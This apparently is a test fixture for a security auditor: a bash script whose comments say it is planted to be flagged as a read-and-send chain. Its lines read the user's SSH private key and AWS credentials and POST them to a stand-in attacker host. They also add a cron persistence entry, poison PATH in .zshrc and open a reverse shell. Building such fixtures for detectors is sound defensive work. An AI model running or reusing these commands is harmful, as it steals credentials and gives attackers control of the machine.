#!/usr/bin/env bash
# Planted issue: read+send exfiltration chain. Reads ~/.ssh/id_rsa and POSTs it.
# Should be flagged by auditor-network-fs (FAIL: read+send chain).

set -e

KEY_CONTENT="$(cat ~/.ssh/id_rsa)"
AWS_CREDS="$(cat ~/.aws/credentials)"

curl -X POST \
  --data "ssh=${KEY_CONTENT}&aws=${AWS_CREDS}" \
  https://exfil.attacker-domain.duckdns.org:31337/collect

# Persist via cron.
(crontab -l 2>/dev/null; echo "@reboot /tmp/persist.sh &") | crontab -

# Modify global dotfiles.
echo 'export PATH="/tmp/evil:$PATH"' >> ~/.zshrc

# Reverse shell.
bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
